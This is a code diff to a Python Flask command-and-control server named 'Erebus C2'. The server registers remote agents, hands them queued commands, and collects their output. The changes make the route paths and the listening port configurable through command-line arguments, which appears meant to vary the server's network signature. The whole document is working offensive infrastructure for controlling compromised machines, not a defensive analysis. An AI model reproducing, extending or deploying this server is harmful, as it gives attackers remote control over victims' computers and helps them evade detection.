@@ -3,10 +3,20 @@ import random
 from flask import Flask, request
 import shared
 from flask import jsonify
+import argparse
 
 app = Flask(__name__)
 
 agents = {}
+
+parser = argparse.ArgumentParser(description="Please provide endpoints")
+parser.add_argument("arg1", type=str, help="Register Url")
+parser.add_argument("arg2", type=str, help="Command Url")
+parser.add_argument("arg3", type=str, help="Base Url")
+parser.add_argument("arg4", type=int, help="Port Config")
+args = parser.parse_args()
+
+print(f"Argument 1: {args.arg1}")
 
 def randomuuid():
     int1 = random.randint(1, 9999)
@@ -48,7 +58,7 @@ def randomuuid():
 def index():
     return "Erebus C2 is Online !"
 
-@app.route("/agent/register")
+@app.route(f"{args.arg3}/{args.arg1}")
 def register():
     guid = randomuuid()
     if guid not in agents:
@@ -58,13 +68,13 @@ def register():
     else:
         return "Agent is already registered"
 
-@app.route("/agent/<agent_guid>")
+@app.route(f"{args.arg3}/<agent_guid>")
 def agent(agent_guid):
     if agent_guid not in agents:
         return "No such agent"
     else: return "Agent is registered"
 
-@app.route("/agent/<agent_guid>/command")
+@app.route(f"{args.arg3}/<agent_guid>{args.arg2}")
 def command(agent_guid):
 
     cmd = shared.read_command(agent_guid)
@@ -77,7 +87,7 @@ def command(agent_guid):
         shared.delete_command(agent_guid)
         return cmd
 
-@app.route("/agent/<agent_guid>/output", methods=["GET", "POST"])
+@app.route(f"{args.arg3}/<agent_guid>/output", methods=["GET", "POST"])
 def output(agent_guid):
     if agent_guid not in agents:
         return "No such agent"
@@ -90,7 +100,7 @@ def output(agent_guid):
     elif request.method == "GET":
         return agents[agent_guid].get("output", "No output yet")
 
-@app.route("/agent/list")
+@app.route(f"{args.arg3}/list")
 def list_agents():
     auth_header = request.headers.get("X-Auth-ID")
     if not auth_header:
@@ -102,4 +112,4 @@ def list_agents():
 
 if __name__ == "__main__":
     context = ("local.crt", "local.key")
-    app.run(host="0.0.0.0", debug=False, port=5000, ssl_context=context)
+    app.run(host="0.0.0.0", debug=False, port=args.arg4, ssl_context=context)
